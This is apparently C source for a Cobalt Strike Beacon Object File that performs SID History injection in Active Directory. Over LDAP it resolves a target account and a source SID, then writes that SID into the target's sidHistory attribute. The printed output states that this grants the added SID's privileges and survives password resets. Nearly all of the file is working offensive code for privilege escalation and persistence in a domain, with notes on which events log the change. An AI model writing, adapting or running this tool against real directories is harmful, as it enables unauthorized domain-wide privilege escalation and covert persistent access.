#include <windows.h>
#include "../../_include/beacon.h"
#include "../common/ldap_common.c"

DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char* buffer, size_t count, const char* format, ...);
DECLSPEC_IMPORT long __cdecl MSVCRT$strtol(const char* str, char** endptr, int base);
DECLSPEC_IMPORT unsigned long __cdecl MSVCRT$strtoul(const char* str, char** endptr, int base);

// Import SID conversion functions from ADVAPI32
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertStringSidToSidA(LPCSTR StringSid, PSID* Sid);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidA(PSID Sid, LPSTR* StringSid);
DECLSPEC_IMPORT PVOID WINAPI KERNEL32$LocalFree(HLOCAL hMem);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$IsValidSid(PSID pSid);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID pSid);

// Get the objectSid attribute from an LDAP entry
BERVAL* GetObjectSid(LDAP* ld, const char* objectDN) {
    if (!ld || !objectDN) return NULL;

    LDAPMessage* searchResult = NULL;
    char* attrs[] = { "objectSid", NULL };

    ULONG result = WLDAP32$ldap_search_s(
        ld,
        (char*)objectDN,
        LDAP_SCOPE_BASE,
        "(objectClass=*)",
        attrs,
        0,
        &searchResult
    );

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query object for SID");
        PrintLdapError("Query objectSid", result);
        return NULL;
    }

    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No entry found");
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }

    // Get binary SID value
    struct berval** values = WLDAP32$ldap_get_values_len(ld, entry, "objectSid");
    if (!values || !values[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve objectSid");
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }

    // Allocate and copy the SID
    BERVAL* sidBerval = (BERVAL*)MSVCRT$malloc(sizeof(BERVAL));
    if (!sidBerval) {
        WLDAP32$ldap_value_free_len(values);
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }

    sidBerval->bv_len = values[0]->bv_len;
    sidBerval->bv_val = (char*)MSVCRT$malloc(sidBerval->bv_len);
    if (!sidBerval->bv_val) {
        MSVCRT$free(sidBerval);
        WLDAP32$ldap_value_free_len(values);
        WLDAP32$ldap_msgfree(searchResult);
        return NULL;
    }

    MSVCRT$memcpy(sidBerval->bv_val, values[0]->bv_val, sidBerval->bv_len);

    WLDAP32$ldap_value_free_len(values);
    WLDAP32$ldap_msgfree(searchResult);

    return sidBerval;
}

// Convert binary SID to string format for display
char* SidToString(PSID sid) {
    if (!sid || !ADVAPI32$IsValidSid(sid)) {
        return NULL;
    }

    LPSTR stringSid = NULL;
    if (!ADVAPI32$ConvertSidToStringSidA(sid, &stringSid)) {
        return NULL;
    }

    // Copy to our own buffer
    size_t len = MSVCRT$strlen(stringSid) + 1;
    char* result = (char*)MSVCRT$malloc(len);
    if (result) {
        MSVCRT$strcpy(result, stringSid);
    }

    KERNEL32$LocalFree(stringSid);
    return result;
}

// Display current SID history
void DisplaySidHistory(LDAP* ld, const char* objectDN) {
    if (!ld || !objectDN) return;

    LDAPMessage* searchResult = NULL;
    char* attrs[] = { "sAMAccountName", "objectSid", "sidHistory", NULL };

    ULONG result = WLDAP32$ldap_search_s(
        ld,
        (char*)objectDN,
        LDAP_SCOPE_BASE,
        "(objectClass=*)",
        attrs,
        0,
        &searchResult
    );

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Unable to query current SID history");
        return;
    }

    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, searchResult);
    if (!entry) {
        WLDAP32$ldap_msgfree(searchResult);
        return;
    }

    // Get sAMAccountName for display
    char** samValues = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
    if (samValues && samValues[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Account: %s", samValues[0]);
        WLDAP32$ldap_value_free(samValues);
    }

    // Get and display objectSid
    struct berval** sidValues = WLDAP32$ldap_get_values_len(ld, entry, "objectSid");
    if (sidValues && sidValues[0]) {
        char* sidStr = SidToString((PSID)sidValues[0]->bv_val);
        if (sidStr) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Current SID: %s", sidStr);
            MSVCRT$free(sidStr);
        }
        WLDAP32$ldap_value_free_len(sidValues);
    }

    // Get and display sidHistory
    struct berval** historyValues = WLDAP32$ldap_get_values_len(ld, entry, "sidHistory");
    if (historyValues) {
        int count = 0;
        while (historyValues[count] != NULL) count++;

        if (count > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Existing SID History (%d):", count);
            for (int i = 0; i < count; i++) {
                char* sidStr = SidToString((PSID)historyValues[i]->bv_val);
                if (sidStr) {
                    BeaconPrintf(CALLBACK_OUTPUT, "    [%d] %s", i + 1, sidStr);
                    MSVCRT$free(sidStr);
                }
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history");
        }
        WLDAP32$ldap_value_free_len(historyValues);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No existing SID history");
    }

    WLDAP32$ldap_msgfree(searchResult);
}

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    
    // Parse arguments: target_identifier, is_target_dn, sid_source, is_sid_source_dn,
    // search_ou, dc_address, use_ldaps
    char* targetIdentifier = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isTargetDN = BeaconDataInt(&parser);
    char* sidSource = ValidateInput(BeaconDataExtract(&parser, NULL));
    int isSidSourceDN = BeaconDataInt(&parser);
    char* searchOu = ValidateInput(BeaconDataExtract(&parser, NULL));
    char* dcAddress = ValidateInput(BeaconDataExtract(&parser, NULL));
    int useLdaps = BeaconDataInt(&parser);
    
    if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target object identifier is required");
        return;
    }
    
    if (!sidSource || MSVCRT$strlen(sidSource) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SID source is required");
        BeaconPrintf(CALLBACK_ERROR, "[!] Can be: SID string (S-1-5-...), username, or DN");
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] WARNING: SID HISTORY INJECTION");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] This is a HIGH-PRIVILEGE operation that:");
    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Requires DS-Install-Replica rights or equivalent");
    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - May be logged extensively (Event ID 4765, 4766)");
    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Can trigger security alerts");
    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Provides persistent privileged access");
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting SID History injection");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s", sidSource);
    
    // Initialize LDAP connection
    char* dcHostname = NULL;
    LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
        return;
    }
    
    char* defaultNC = NULL;
    char* targetDN = NULL;
    
    if (!isTargetDN) {
        
        defaultNC = GetDefaultNamingContext(ld, dcHostname);
        if (!defaultNC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
            if (dcHostname) MSVCRT$free(dcHostname);
            CleanupLDAP(ld);
            return;
        }
    }
    
    // Resolve target DN
    if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetIdentifier) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) {
            MSVCRT$strcpy(targetDN, targetIdentifier);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using provided target DN");
    } else {
        
        char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
        targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
        
        if (!targetDN) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
            BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found", targetIdentifier);
            if (defaultNC) MSVCRT$free(defaultNC);
            CleanupLDAP(ld);
            return;
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target DN: %s", targetDN);
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Display current state
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Current target object state:");
    DisplaySidHistory(ld, targetDN);
    BeaconPrintf(CALLBACK_OUTPUT, "");
    
    // Determine SID to add
    BERVAL* sidToAdd = NULL;
    char* sidString = NULL;
    
    // Check if sidSource is a string SID (starts with "S-")
    if (sidSource[0] == 'S' && sidSource[1] == '-') {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsing string SID...");
        
        // Convert string SID to binary
        PSID binarySid = NULL;
        if (!ADVAPI32$ConvertStringSidToSidA(sidSource, &binarySid)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse SID string");
            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid SID format: %s", sidSource);
            goto cleanup;
        }
        
        if (!ADVAPI32$IsValidSid(binarySid)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Invalid SID");
            KERNEL32$LocalFree(binarySid);
            goto cleanup;
        }
        
        // Create BERVAL from binary SID
        DWORD sidLen = ADVAPI32$GetLengthSid(binarySid);
        sidToAdd = (BERVAL*)MSVCRT$malloc(sizeof(BERVAL));
        if (sidToAdd) {
            sidToAdd->bv_len = sidLen;
            sidToAdd->bv_val = (char*)MSVCRT$malloc(sidLen);
            if (sidToAdd->bv_val) {
                MSVCRT$memcpy(sidToAdd->bv_val, binarySid, sidLen);
            } else {
                MSVCRT$free(sidToAdd);
                sidToAdd = NULL;
            }
        }
        
        sidString = (char*)MSVCRT$malloc(MSVCRT$strlen(sidSource) + 1);
        if (sidString) {
            MSVCRT$strcpy(sidString, sidSource);
        }
        
        KERNEL32$LocalFree(binarySid);
        
        if (!sidToAdd || !sidToAdd->bv_val) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate SID buffer");
            goto cleanup;
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SID to add: %s", sidSource);
        
    } else {
        // Resolve SID from object (DN or username)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Resolving SID from object...");
        
        char* sourceDN = NULL;
        
        if (isSidSourceDN) {
            // Use provided DN
            size_t len = MSVCRT$strlen(sidSource) + 1;
            sourceDN = (char*)MSVCRT$malloc(len);
            if (sourceDN) {
                MSVCRT$strcpy(sourceDN, sidSource);
            }
        } else {
            // Search for source object by username
            char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
            sourceDN = FindObjectDN(ld, sidSource, searchBase);
            
            if (!sourceDN) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve source object");
                BeaconPrintf(CALLBACK_ERROR, "[!] Source '%s' not found", sidSource);
                goto cleanup;
            }
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Source DN: %s", sourceDN);
        
        // Get SID from source object
        sidToAdd = GetObjectSid(ld, sourceDN);
        MSVCRT$free(sourceDN);
        
        if (!sidToAdd) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve SID from source object");
            goto cleanup;
        }
        
        // Convert to string for display
        sidString = SidToString((PSID)sidToAdd->bv_val);
        if (sidString) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SID to add: %s", sidString);
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding SID to sidHistory attribute...");
    
    // Prepare LDAP modification
    BERVAL* sid_bervals[2] = { sidToAdd, NULL };
    LDAPModA sid_mod;
    sid_mod.mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
    sid_mod.mod_type = "sidHistory";
    sid_mod.mod_vals.modv_bvals = sid_bervals;
    
    LDAPModA* mods[] = { &sid_mod, NULL };
    
    // Perform modification
    ULONG result = WLDAP32$ldap_modify_s(ld, targetDN, mods);
    
    if (result == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!");
        BeaconPrintf(CALLBACK_OUTPUT, "");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %s", targetDN);
        if (sidString) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s", sidString);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] The target object now has the privileges of the SID added");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] This change persists across password resets");
        BeaconPrintf(CALLBACK_OUTPUT, "");
        
        // Display updated state
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Updated object state:");
        DisplaySidHistory(ld, targetDN);
        
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add SID to sidHistory");
        PrintLdapError("Add sidHistory", result);
        BeaconPrintf(CALLBACK_OUTPUT, "");
        
        if (result == LDAP_INSUFFICIENT_RIGHTS) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Insufficient permissions");
            BeaconPrintf(CALLBACK_ERROR, "[!] Required rights:");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - DS-Install-Replica (domain controller install rights)");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - Or 'Migrate SID History' extended right");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - Typically only Domain Admins or Enterprise Admins");
        } else if (result == LDAP_UNWILLING_TO_PERFORM) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Server refused to perform operation");
            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID filtering is enabled");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - Target is a protected account");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - Forest functional level restrictions");
        } else if (result == LDAP_CONSTRAINT_VIOLATION) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Constraint violation");
            BeaconPrintf(CALLBACK_ERROR, "[!] Possible causes:");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID already exists in sidHistory");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - SID is from same domain (not allowed)");
            BeaconPrintf(CALLBACK_ERROR, "[!]   - Invalid SID format");
        } else if (result == LDAP_OBJECT_CLASS_VIOLATION) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Target object type doesn't support sidHistory");
            BeaconPrintf(CALLBACK_ERROR, "[!] sidHistory is only valid on user and computer objects");
        }
    }
    
cleanup:
    // Cleanup
    if (sidToAdd) {
        if (sidToAdd->bv_val) MSVCRT$free(sidToAdd->bv_val);
        MSVCRT$free(sidToAdd);
    }
    if (sidString) MSVCRT$free(sidString);
    if (defaultNC) MSVCRT$free(defaultNC);
    if (targetDN) MSVCRT$free(targetDN);
    if (dcHostname) MSVCRT$free(dcHostname);
    CleanupLDAP(ld);
    
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Operation complete");
}